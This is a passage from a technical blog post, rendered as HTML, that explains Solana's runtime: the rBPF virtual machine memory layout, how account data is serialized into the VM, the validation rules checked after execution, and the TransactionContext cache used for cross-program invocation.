</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Instruction</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>              </span><span class="token token" style="color:#999">// Program to execute</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>      </span><span class="token token" style="color:#999">// Accounts this instruction will access</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>                   </span><span class="token token" style="color:#999">// Instruction-specific data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">The rBPF Virtual Machine</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Solana programs are typically written in Rust and compiled to a variant of eBPF (extended Berkeley Packet Filter) bytecode. The validator executes this bytecode within a sandboxed virtual machine.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">For each transaction, the validator allocates a dedicated, isolated memory space for the VM. The virtual address memory map used by Solana SBF programs is fixed and laid out as follows:</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#f08d49">0x100000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">CODE</span><span>     </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Program</span><span> executable bytecode
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span></span><span class="token token" style="color:#f08d49">0x200000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">STACK</span><span>    </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Call</span><span> </span><span class="token token" style="color:#f08d49">stack</span><span> </span><span class="token token" style="color:#ccc">(</span><span>4KB frames</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span></span><span class="token token" style="color:#f08d49">0x300000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">HEAP</span><span>     </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Dynamic</span><span> </span><span class="token token" style="color:#f08d49">memory</span><span> </span><span class="token token" style="color:#ccc">(</span><span>32KB region</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span></span><span class="token token" style="color:#f08d49">0x400000000</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f8c555">INPUT</span><span>    </span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Program</span><span> input parameters </span><span class="token token" style="color:#67cdcc">&amp;</span><span> serialized account data</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Within the VM, during execution, programs can modify their own memory however they want without affecting the memory stored on the host. All validation is checked after the program execution completes.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">The Legacy Model: Single Program Execution (~v1.14.x)</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Let&#x27;s first understand how a simple program execution flows in the legacy model. This process involves four main phases: loading accounts from the database, executing bytecode in the rBPF VM, validating changes to guarantee integrity, and committing the results to storage.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/single_program_memory_layout.png" alt="Single Program Memory Layout"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">As shown in the diagram above, the legacy model serializes all account data into a contiguous <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region. Here&#x27;s how this process works:</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Phase 1: Loading and Serializing Accounts</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The host and VM operate in completely isolated environments, they can&#x27;t share objects or pointers directly. All account data must cross this boundary through serialization and deserialization, creating a controlled interface between the trusted host and the sandboxed VM.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The validator loads all requested accounts from the database and serializes them into a binary blob that gets copied into the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region at <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">0x400000000</code>. Once inside the VM, programs usually start by deserializing the raw serialized <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Accounts</code> into <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> structures in its bootstrap routine<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align:0" xmlns="http://www.w3.org/2000/svg" width="0.988ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 436.6 833.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"></g><g data-mml-node="mn" transform="translate(33,363) scale(0.707)"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use></g></g></g></g></svg></mjx-container>. The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> are stored in the VM&#x27;s heap memory before handing control to the program entrypoint function:</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#999">// How programs reconstruct AccountInfo from the serialized data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> key</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>  </span><span class="token token" style="color:#999">// Points directly into INPUT region!</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Epoch</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_signer</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_writable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo.data</code> points directly into the serialized representation within the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region. For instance, if a program writes <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">account.data.borrow_mut()[0] = 42</code>, it&#x27;s modifying the serialized data in VM memory.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align:0" xmlns="http://www.w3.org/2000/svg" width="0.988ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 436.6 833.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"></g><g data-mml-node="mn" transform="translate(33,363) scale(0.707)"><use data-c="31" xlink:href="#MJX-2-TEX-N-31"></use></g></g></g></g></svg></mjx-container> Programs can interact directly with the serialized bytes. Parsing serialized accounts into <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo</code> is just what the solana program sdk does to make life easier for developers.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Phase 2: Program Execution</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Once the accounts are serialized and loaded into the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">INPUT</code> region, the rBPF VM executes the program bytecode. The program has absolute control over its virtual memory space. It can overwrite account balances, change ownership, modify data, even corrupt the entire memory space. This design choice allows for maximum performance during execution, with security enforcement deferred to the validation phase.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Phase 3: Post-Execution Validation</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">After the program finishes execution, the validator validates every change made during execution. It doesn&#x27;t trust anything that happened during execution. Instead, it carefully checks every modification to ensure no rules were broken and no money was stolen.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Validation rules ensure state consistency and permission enforcement before persisting account state updates to storage:</p>
<ul class="text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6">
<li class="my-2">Account fields modifiable only if the account is marked writable in the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Transaction</code> and <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instruction</code>.</li>
<li class="my-2">Only the account owner modifies <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">owner</code> and <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">data</code>.</li>
<li class="my-2"><code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Owner</code> modifiable only when data is zeroed.</li>
<li class="my-2">Lamports can be increased by anyone but decreased only by the owner.</li>
<li class="my-2">Total lamports remains consistent across transaction execution.</li>
</ul>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Phase 4: Final Commit</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">After all validation rules pass, the modified account states are committed back to the database. All changes made during program execution are now persisted and the transaction is confirmed. If any validation rule fails, the entire transaction is rejected and no changes are stored.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Sounds simple, right?</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">When Programs Need to Talk: Cross-Program Invocation (v1.14.x)</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">But what happens when programs need to invoke each other, for instance, when your dex program needs to call the token program to transfer tokens? This is where Cross-Program Invocation (CPI) comes in, and where the elegant simplicity of single program execution starts to break down.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The challenge is that each program runs in its own isolated VM with its own memory space. When Program A calls Program B, they can&#x27;t simply share pointers or objects. Account data must be carefully marshaled between these isolated environments while maintaining security and consistency.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">TransactionContext: Shared Account Cache</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This brings us to a detail we omitted up till now. Since <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Transaction</code> are atomic and may include multiple <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instruction</code>, it must have a way to cache temporal execution results of earlier <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code> before latter <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code> finish. This cache is crucial since we can&#x27;t allow executions effects of earlier <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code> to persist if unfortunately latter <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Instructions</code> revert.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">To this end, Solana introduces the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> structure state caching. The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> contains <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> structures, which are used to hold changes to accounts before the runtime either commits the changes to permanent storage, or reverts them later.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">TransactionContext</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    account_keys</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pin</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>              </span><span class="token token" style="color:#999">// All account addresses in transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">TransactionAccounts</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>            </span><span class="token token" style="color:#999">// Shared account data cache</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    instruction_stack</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">InstructionContext</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>    </span><span class="token token" style="color:#999">// CPI call stack</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">TransactionAccounts</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">AccountSharedData</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// Mutable account data</span><span>
